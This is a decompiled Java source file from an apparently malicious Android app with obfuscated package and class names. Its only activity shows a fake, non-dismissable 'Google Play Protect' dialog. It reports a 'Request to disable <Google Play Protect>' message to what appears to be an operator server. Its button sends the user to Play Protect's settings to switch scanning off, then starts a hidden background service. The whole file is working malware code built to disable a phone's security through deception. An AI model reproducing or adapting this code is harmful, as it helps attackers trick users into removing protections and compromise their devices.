package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import wocwvy.czyxoxmbauu.slsa.C0020b;
import wocwvy.czyxoxmbauu.slsa.R;
import wocwvy.czyxoxmbauu.slsa.usbvhkriufnc;

/* JADX INFO: loaded from: classes.dex */
public class ovyvpsbxxrtayd extends Activity {

    /* JADX INFO: renamed from: a */
    C0020b f462a = new C0020b();

    /* JADX INFO: renamed from: b */
    Context f463b;

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        String strM251e;
        String strM251e2;
        super.onCreate(bundle);
        this.f463b = this;
        try {
            strM251e = this.f462a.m251e(this, "textPlayProtect");
        } catch (Exception unused) {
            strM251e = "";
        }
        try {
            strM251e2 = this.f462a.m251e(this, "buttonPlayProtect");
        } catch (Exception unused2) {
            strM251e2 = "";
        }
        C0020b c0020b = this.f462a;
        StringBuilder sb = new StringBuilder();
        sb.append("p=");
        sb.append(this.f462a.m242c(this.f462a.m264q(this) + "|Request to disable <Google Play Protect>!|"));
        c0020b.m235b(this, "4", sb.toString());
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Google Play Protect").setMessage(strM251e).setIcon(R.drawable.im).setCancelable(false).setNegativeButton(strM251e2, new DialogInterface.OnClickListener() { // from class: wocwvy.czyxoxmbauu.slsa.ncec.ovyvpsbxxrtayd.1
            @Override // android.content.DialogInterface.OnClickListener
            public void onClick(DialogInterface dialogInterface, int i) {
                Intent intent = new Intent();
                intent.setClassName("com.google.android.gms", "com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
                try {
                    ovyvpsbxxrtayd.this.startActivity(intent);
                    ovyvpsbxxrtayd.this.f463b.startService(new Intent(ovyvpsbxxrtayd.this.f463b, (Class<?>) usbvhkriufnc.class));
                } catch (ActivityNotFoundException unused3) {
                    ovyvpsbxxrtayd.this.f462a.m230a("ERROR", "ActPlayProtect");
                }
                dialogInterface.cancel();
            }
        });
        try {
            builder.create().show();
        } catch (Exception unused3) {
        }
    }
}
